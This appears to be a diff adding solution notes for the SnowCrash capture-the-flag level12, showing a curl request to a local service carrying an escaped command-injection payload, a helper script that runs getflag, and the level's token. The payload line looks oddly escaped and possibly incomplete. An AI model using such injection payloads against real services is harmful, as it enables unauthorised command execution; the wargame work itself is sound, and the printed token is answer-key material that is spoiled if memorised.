@@ -1,0 +1,8 @@
+curl localhost:4646 -d x=\"\%3b\<\<\\\"\\
+
+level12@SnowCrash:~$ cat /tmp/xd
+#!/bin/sh
+
+getflag > /tmp/token
+level12@SnowCrash:~$ cat /tmp/token
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
